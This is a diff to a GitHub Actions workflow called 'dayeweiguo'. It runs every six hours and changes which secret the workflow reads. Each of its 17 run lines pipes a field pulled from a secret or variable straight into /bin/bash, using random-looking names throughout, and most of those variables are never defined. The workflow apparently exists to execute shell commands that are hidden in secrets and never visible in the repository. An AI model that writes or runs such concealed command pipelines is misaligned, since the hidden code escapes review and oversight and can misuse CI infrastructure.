@@ -3,7 +3,8 @@ name: dayeweiguo
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 2/6 * * *'
+    - cron: '14 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,21 +12,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: dayeweiguo
         env:
-          btzn15719: ${{ secrets.btzn15719 }}
+          m072: ${{ secrets.m072 }}
         run: |
-          echo $btzn15719 | jq -r .slbuk56 | /bin/bash
-          echo $p33768 | jq -r .mg5593 | /bin/bash
-          echo $tbipq45888 | jq -r .hbv926 | /bin/bash
-          echo $mnkr5044 | jq -r .fc83557 | /bin/bash
-          echo $r2119 | jq -r .mi47757 | /bin/bash
-          echo $ti9131 | jq -r .jxkfi73 | /bin/bash
-          echo $lrsvy1896 | jq -r .ptae5293 | /bin/bash
-          echo $r702 | jq -r .r6304 | /bin/bash
-          echo $e8 | jq -r .z874 | /bin/bash
-          echo $r965 | jq -r .id418 | /bin/bash
-          echo $vkw35547 | jq -r .gopsq24 | /bin/bash
-          echo $k669 | jq -r .oh334 | /bin/bash
-          echo $xd76 | jq -r .ioleo1929 | /bin/bash
-          echo $mks1 | jq -r .kqez41 | /bin/bash
-          echo $e6 | jq -r .v965 | /bin/bash
+          echo $m072 | jq -r .vlix3035 | /bin/bash
+          echo $u408 | jq -r .qn5763 | /bin/bash
+          echo $zu42 | jq -r .pydgx0 | /bin/bash
+          echo $iwg43955 | jq -r .tmtv96 | /bin/bash
+          echo $ykyx7700 | jq -r .aev27 | /bin/bash
+          echo $zk89 | jq -r .b82358 | /bin/bash
+          echo $lzmac6 | jq -r .lbgw6 | /bin/bash
+          echo $sny7 | jq -r .sghlb6 | /bin/bash
+          echo $fjw63 | jq -r .l4 | /bin/bash
+          echo $fmozi0197 | jq -r .yedv52583 | /bin/bash
+          echo $aj6 | jq -r .ldat2169 | /bin/bash
+          echo $mour0052 | jq -r .b275 | /bin/bash
+          echo $dl92 | jq -r .dw97 | /bin/bash
+          echo $vpvk2 | jq -r .hauhr68 | /bin/bash
+          echo $dpfl03087 | jq -r .nizpv7 | /bin/bash
+          echo $a4618 | jq -r .wv8202 | /bin/bash
+          echo $zxz855 | jq -r .entpw30409 | /bin/bash
 
